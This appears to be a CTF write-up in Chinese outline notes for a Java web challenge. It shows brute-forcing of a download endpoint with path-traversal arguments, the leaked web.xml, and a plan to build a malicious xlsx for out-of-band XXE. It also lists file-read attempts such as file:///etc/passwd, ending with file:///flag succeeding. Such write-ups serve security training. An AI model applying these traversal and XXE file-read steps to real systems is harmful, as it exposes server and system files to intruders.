- # 过程
	- 爆破下载接口
		- ```python
		  0it [00:00, ?it/s]INFO:root:[Auto Burst] Get: 137 Arg: .git
		  118it [00:11,  8.64it/s]INFO:root:[Auto Burst] Get: 1207 Arg: ../../../../WEB-INF/web.xml
		  128it [00:12,  9.79it/s]INFO:root:[Auto Burst] Get: -500 Arg: ../../../../WEB-INF/classes
		  528it [00:54,  8.91it/s]INFO:root:[Auto Burst] Get: 129 Arg: flag
		  1140it [01:58,  9.59it/s]
		  ```
	- 查看web.xml
		- ```xml
		  <web-app xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd" version="4.0">
		  <servlet>
		  <servlet-name>DownloadServlet</servlet-name>
		  <servlet-class>cn.abc.servlet.DownloadServlet</servlet-class>
		  </servlet>
		  <servlet-mapping>
		  <servlet-name>DownloadServlet</servlet-name>
		  <url-pattern>/DownloadServlet</url-pattern>
		  </servlet-mapping>
		  <servlet>
		  <servlet-name>ListFileServlet</servlet-name>
		  <servlet-class>cn.abc.servlet.ListFileServlet</servlet-class>
		  </servlet>
		  <servlet-mapping>
		  <servlet-name>ListFileServlet</servlet-name>
		  <url-pattern>/ListFileServlet</url-pattern>
		  </servlet-mapping>
		  <servlet>
		  <servlet-name>UploadServlet</servlet-name>
		  <servlet-class>cn.abc.servlet.UploadServlet</servlet-class>
		  </servlet>
		  <servlet-mapping>
		  <servlet-name>UploadServlet</servlet-name>
		  <url-pattern>/UploadServlet</url-pattern>
		  </servlet-mapping>
		  </web-app>
		  ```
	- 下载并反编译class文件，看到`cn.abc.servlet.UploadServlet`会读取以excel开头的xls文件
	  id:: 643172ce-5398-4e55-bee1-2e99a54ba9a3
	- 准备一个恶意xlsx文件：修改后缀为zip并解压一个xlsx文件，修改里面的xml文件，再压缩
	- 这里使用[OOB](((64301d45-52ef-4288-a4f1-f268848799a7)))来读取文件
		- `file:///`失败，无法读取文件夹
		- `/etc/passwd`失败，应该是无法读取多行文件
		- `file:///etc/passwd`失败
		- `flag`失败
		- `./flag`失败
		- `file://./flag`失败
		- `file:///flag`成功
	-
	-